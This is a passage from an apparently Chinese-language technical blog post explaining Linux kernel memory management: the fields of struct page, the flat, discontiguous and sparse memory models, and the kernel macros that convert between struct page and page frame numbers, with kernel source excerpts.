<code>LRU_UNEVICTABLE</code> 链表中</p><p><code>PG_mlocked</code>：该页被对应的 vma 上锁（通常是系统调用 mlock）</p><p><code>PG_uncached</code>：该页被设置为不可缓存</p><p><code>PG_hwpoison</code>：硬件相关的标志位</p><p><code>PG_arch_2</code>：64位下的体系结构相关标志位</p></blockquote><p><code>flags</code>标志位还存在复用的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * page-&gt;flags layout:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are five possibilities for how page-&gt;flags get laid out.  The first</span></span><br><span class="line"><span class="comment"> * pair is for the normal case without sparsemem. The second pair is for</span></span><br><span class="line"><span class="comment"> * sparsemem when there is plenty of space for node and section information.</span></span><br><span class="line"><span class="comment"> * The last is when there is insufficient space in page-&gt;flags and a separate</span></span><br><span class="line"><span class="comment"> * lookup is necessary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * No sparsemem or sparsemem vmemmap: |       NODE     | ZONE |             ... | FLAGS |</span></span><br><span class="line"><span class="comment"> *      &quot; plus space for last_cpupid: |       NODE     | ZONE | LAST_CPUPID ... | FLAGS |</span></span><br><span class="line"><span class="comment"> * classic sparse with space for node:| SECTION | NODE | ZONE |             ... | FLAGS |</span></span><br><span class="line"><span class="comment"> *      &quot; plus space for last_cpupid: | SECTION | NODE | ZONE | LAST_CPUPID ... | FLAGS |</span></span><br><span class="line"><span class="comment"> * classic sparse no space for node:  | SECTION |     ZONE    | ... | FLAGS |</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><code>flags</code>字段会为了节省内存与其他结构共用空间，具体划分形式与内核配置的内存模型有关，可以看到上面讲起话氛围了五种，其实是三大种。</p><p>第一种：<strong>非sparse内存模式</strong></p><p><img   src="/images/8J9pm3n1eZuTKi6.png" ></p><p>如上图所示，低位用作该 page 的 flag，高位分别标识其归属的 zone， node id（非 NUMA 系统中为0），中间剩余的位保留。</p><p>第二种：<strong>sparse内存模式</strong></p><p><img   src="/images/CETbQSKwV8er5OR.png" ></p><p>如上图所示，相比起第一种形式多了一个 SECTION 字段标识其归属的 <code>mem_section</code>。</p><p>第三种：<strong>没有Node的sparse内存模式</strong></p><p>即在第二种的基础上去掉node字段。这一模式主要适用于非NUMA系统，在这种情况下取消了NODE结构。</p><h3 id="lru：链表节点"><a href="#lru：链表节点" class="headerlink" title="lru：链表节点"></a>lru：链表节点</h3><p>lru大家应该都是较为熟悉的，在操作系统课上学习过页面置换算法。</p><p><img   src="/images/QbuxcXTWdzMari5.png" ></p><p>如上图所示，page结构体由lru组织成链表。</p><h3 id="slab：相关结构体"><a href="#slab：相关结构体" class="headerlink" title="slab：相关结构体"></a>slab：相关结构体</h3><p>在低版本的page结构体中专门有一个匿名变量用来存放于slab相关的成员的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* slab, slob and slub */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Partial pages */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="keyword">int</span> pages;<span class="comment">/* Nr of pages left */</span></span><br><span class="line"><span class="keyword">int</span> pobjects;<span class="comment">/* Approximate count */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> pages;</span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* not slob */</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="keyword">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> *s_mem;<span class="comment">/* slab: first object */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;<span class="comment">/* SLUB */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* SLUB */</span></span><br><span class="line"><span class="keyword">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="keyword">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="keyword">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>关于slab的内容就不多赘述了，可以看前一篇文章 <a class="link"   href="https://cv196082.gitee.io/2023/11/23/Pspray-Timing-Side-Channel-based-Linux-Kernel-Heap-Exploitation-Technique/" >Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique<i class="fas fa-external-link-alt"></i></a> 。</p><h3 id="mapcount：映射计数"><a href="#mapcount：映射计数" class="headerlink" title="_mapcount：映射计数"></a>_mapcount：映射计数</h3><p>记录该页被页表映射的次数，每个进程有其独立的页表，故可以理解为该值记录了该页被多少个进程共享，其初始值为 -1。由于这是一个联合体，若是该页没有被映射到用户空间，则为 page_type 字段</p><h3 id="refcount：引用计数"><a href="#refcount：引用计数" class="headerlink" title="_refcount：引用计数"></a>_refcount：引用计数</h3><p>引用计数相比应该都很熟悉的，该字段用作该页面在内核中的引用计数器，初始时页面为空闲状态，该计数器为 0，每当该页面被分配引用时计数器会 + 1，被其他页面进行引用时也会 + 1。当引用计数器为 0 时表示该页面为空闲状态或即将要被释放，若大于 0 则表示正在被使用，暂时不会释放。</p><p>内核中提供了两个函数 <code>get_page()</code>与 <code>put_page()</code> 来进行引用计数的增减</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">put_page</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span> =</span> page_folio(page);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For some devmap managed pages we need to catch refcount transition</span></span><br><span class="line"><span class="comment"> * from 2 to 1:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (put_devmap_managed_page(&amp;folio-&gt;page))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">folio_put(folio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会调用<code>folio_put</code>函数来检测是否引用计数为0然后是否释放该页。</p><h3 id="virtual：虚拟地址"><a href="#virtual：虚拟地址" class="headerlink" title="virtual：虚拟地址"></a>virtual：虚拟地址</h3><p>该字段为该物理页框对应的的虚拟地址</p><p><img   src="/images/q6jTAJkU9XuCHWV.png" ></p><p>每一个 struct page 对应一个物理页框，那么这个 virtual 字段其实就是上图的反向映射。</p><h2 id="不同内存模型下的struct-page存储方式"><a href="#不同内存模型下的struct-page存储方式" class="headerlink" title="不同内存模型下的struct page存储方式"></a>不同内存模型下的struct page存储方式</h2><p><img   src="/images/wLzFuCB5n1DAIY7.png" ></p><p>Linux 提供了上图中的三种内存模型，内存模型在编译时就会被确定下来，目前最为常用的是<code>Sparse Memory</code>模型。</p><h3 id="Flat-Memory"><a href="#Flat-Memory" class="headerlink" title="Flat Memory"></a>Flat Memory</h3><p>平滑内存模型。物理内存地址连续，有一个<strong>全局变量</strong> <code>mem_map</code> 由一个大的<code>struct page</code>数组直接对应现有的物理内存</p><h3 id="Discontiguous-Memory"><a href="#Discontiguous-Memory" class="headerlink" title="Discontiguous Memory"></a>Discontiguous Memory</h3><p>非连续性内存模型，对于每一段连续的物理内存，都有一个 <code>pglist_data</code> 结构体进行对应，其成员 <code>node_mem_map</code> 为一个<code>struct page</code>指针，指向一个 page 结构体数组，由该结构体对应到该段连续物理内存。有一个<strong>全局变量</strong> <code>node_data</code> 为一个<code>pglist_data</code>指针数组，其中存放着指向每一个<code>pglist_data</code>的指针，该数组的大小为 <code>MAX_NUMNODES</code>。主要针对内存中存在空洞的情况。</p><h3 id="Sparse-Memory"><a href="#Sparse-Memory" class="headerlink" title="Sparse Memory"></a>Sparse Memory</h3><p>离散内存模型，在一个<code>mem_section</code>结构体中存在一个 <code>section_mem_map</code> 成员指向一个<code>struct page</code>数组对应一段连续的物理内存，即将内存按照 section 为单位进行分段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is, logically, a pointer to an array of struct</span></span><br><span class="line"><span class="comment"> * pages.  However, it is stored with some other magic.</span></span><br><span class="line"><span class="comment"> * (see sparse.c::sparse_init_one_section())</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Additionally during early boot we encode node id of</span></span><br><span class="line"><span class="comment"> * the location of the section here to guide allocation.</span></span><br><span class="line"><span class="comment"> * (see sparse.c::memory_present())</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Making it a UL at least makes someone do a cast</span></span><br><span class="line"><span class="comment"> * before using it wrong.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> section_mem_map;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section_usage</span> *<span class="title">usage</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If SPARSEMEM, pgdat doesn&#x27;t have page_ext pointer. We use</span></span><br><span class="line"><span class="comment"> * section. (see page_ext.h about this.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">page_ext</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pad;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * WARNING: mem_section must be a power-of-2 in size for the</span></span><br><span class="line"><span class="comment"> * calculation and use of SECTION_ROOT_MASK to make sense.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>存在一个全局指针数组 <code>mem_section</code> （与结构体同名）存放所有的 <code>mem_section</code> 指针，指向理论上支持的内存空间，每个 section 对应的物理内存不一定存在，若不存在则此时该 section 的指针为 NULL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> **<span class="title">mem_section</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> <span class="title">mem_section</span>[<span class="title">NR_SECTION_ROOTS</span>][<span class="title">SECTIONS_PER_ROOT</span>]</span></span><br><span class="line"><span class="class">____<span class="title">cacheline_internodealigned_in_smp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>若未开启<code>CONFIG_SPARSEMEM_EXTREME</code>编译选项则 mem_section 为一个常规的<strong>二维数组</strong>，否则为一个<strong>二级指针</strong>，其所指向空间内存动态分配。</p><p><img   src="/images/RN47OEoaM31xQhA.png" ></p><p>这种模型支持内存的热拔插。</p><p>这里需要注意到的是，在<code>struct mem_section</code>结构体中的<code>section_mem_map</code>成员的定义并非是<code>struct page*</code>而是<code>unsigned long</code>类型的，其记录的其实是 page 数组与PFN之间的差值<code>section_mem_map = page_arr_addr - PFN_start</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(CONFIG_SPARSEMEM)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note: section&#x27;s mem_map is encoded to reflect its start_pfn.</span></span><br><span class="line"><span class="comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)\</span></span><br><span class="line"><span class="meta">(&#123;const struct page *__pg = (pg);\</span></span><br><span class="line"><span class="meta">int __sec = page_to_section(__pg);\</span></span><br><span class="line"><span class="meta">(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)\</span></span><br><span class="line"><span class="meta">(&#123;unsigned long __pfn = (pfn);\</span></span><br><span class="line"><span class="meta">struct mem_section *__sec = __pfn_to_section(__pfn);\</span></span><br><span class="line"><span class="meta">__section_mem_map_addr(__sec) + __pfn;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_FLATMEM/SPARSEMEM */</span></span></span><br></pre></td></tr></table></figure><p>在内核中也提供了 PFN 和 page 之间转化的两个宏定义，这里详细分析一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)\</span></span><br><span class="line"><span class="meta">(&#123;const struct page *__pg = (pg);\</span></span><br><span class="line"><span class="meta">int __sec = page_to_section(__pg);\</span></span><br><span class="line"><span class="meta">(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p>首先看page到PFN的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">page_to_section</span><span class="params">(<span class="keyword">const</span> struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (page-&gt;flags &gt;&gt; SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会使用<code>page_to_setion</code>函数，其函数内部实现是通过<code>page-&gt;flags</code>获取到page所属的section标号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">nr_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">nr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> root = SECTION_NR_TO_ROOT(nr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(root &gt;= NR_SECTION_ROOTS))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="keyword">if</span> (!mem_section || !mem_section[root])</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> &amp;mem_section[root][nr &amp; SECTION_ROOT_MASK];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后通过调用<code>__nr_to_section</code>函数获得对应<code>mem_section</code>结构体的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTIONS_PER_ROOT       (PAGE_SIZE / sizeof (struct mem_section))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTIONS_PER_ROOT1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTION_NR_TO_ROOT(sec)((sec) / SECTIONS_PER_ROOT)</span></span><br></pre></td></tr></table></figure><p>这里默认开启<code>CONFIG_SPARSEMEM_EXTREME</code>，此时<code>SECTIONS_PER_ROOT</code>含义为一页中<code>struct mem_section</code>的数量，所以<code>SECTION_NR_TO_ROOT</code>宏得到的是对应的页下表，最后通过<code>nr &amp; SECTION_ROOT_MASK</code>获得在该页下的<code>mem_section</code>数组下标。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">section_mem_map_addr</span>(<span class="keyword">struct</span> <span class="title">mem_section</span> *<span class="title">section</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">map</span> = section-&gt;section_mem_map;</span><br><span class="line"><span class="built_in">map</span> &amp;= SECTION_MAP_MASK;</span><br><span class="line"><span class="keyword">return</span> (struct page *)<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后通过<code>__section_mem_map_addr</code>获取<code>mem_section</code>结构体中<code>section_mem_map</code>成员，最后与page结构体的地址做差运算便能获得其PFN，根据前面的条件可以得到最终的运算写法其实是<code>(page_addr - page_arr_addr) + PFN_start = PFN</code>。</p><p>接下看一下<code>__pfn_to_page</code>了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)\</span></span><br><span class="line"><span class="meta">(&#123;unsigned long __pfn = (pfn);\</span></span><br><span class="line"><span class="meta">struct mem_section *__sec = __pfn_to_section(__pfn);\</span></span><br><span class="line"><span class="meta">__section_mem_map_addr(__sec) + __pfn;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_SECTION_SHIFT(SECTION_SIZE_BITS - PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">pfn_to_section_nr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> pfn &gt;&gt; PFN_SECTION_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">pfn_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">return</span> __nr_to_section(pfn_to_section_nr(pfn));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先调用<code>__pfn_to_section</code>函数来获得PFN对应的<code>mem_section</code>。首先通过调用<code>pfn_to_section_nr</code>函数获取对应section的索引。可以看到函数中使用到了<code>PFN_SECTION_SHIFT</code>，而其定义为<code>SECTION_SIZE_BITS</code>减去<code>PAGE_SHIFT</code>，其中<code>SECTION_SIZE_BITS</code>的含义为一个section所占的位数，后面则是很熟悉的一个页的位数，所以<code>PFN_SECTION_SHIFT</code>含义为一个section中页的数量。</p><p>而<code>pfn_to_section_nr</code>函数内部实现为使用页框号向右移位一个section中页的数量最终得到的是当前页在section中的标号。</p><p>随后调用<code>__nr_to_section</code>函数获取对应<code>mem_section</code>地址，最后使用<code>__section_mem_map_addr</code>函数获取到<code>section_mem_map</code>成员再与页框号做加法，根据前面的条件这里最终运算的写法可以写作<code>(PFN - PFN_start) + page_arr_addr = page_addr </code>。</p><p><strong>最后，基于Sparse Memory 内存模型上引入了 vmemmap 的概念，是目前 Linux 最常用的内存模型之一。</strong></p><p><img   src="/images/mnAUkENCoRwjtpq.png" ></p><p>在开启了<code>vmemmap</code>之后，所有的<code>mem_section</code>中的 page 都抽象到一个虚拟数组<code>vmemmap</code>中，这样在进行<code>struct page *</code>和 pfn 转换时，直接使用<code>vmemmap</code>数组即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(CONFIG_SPARSEMEM_VMEMMAP)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* memmap is virtually contiguous.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)(vmemmap + (pfn))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(page)(unsigned long)((page) - vmemmap)</span></span><br></pre></td></tr></table></figure><h2 id="struct-zone"><a href="#struct-zone" class="headerlink" title="struct zone"></a>struct zone</h2><p>在 Linux 下将一个节点内不同用途的内存区域划分为不同的区即<code>zone</code>，对应结构体 <code>struct zone</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span 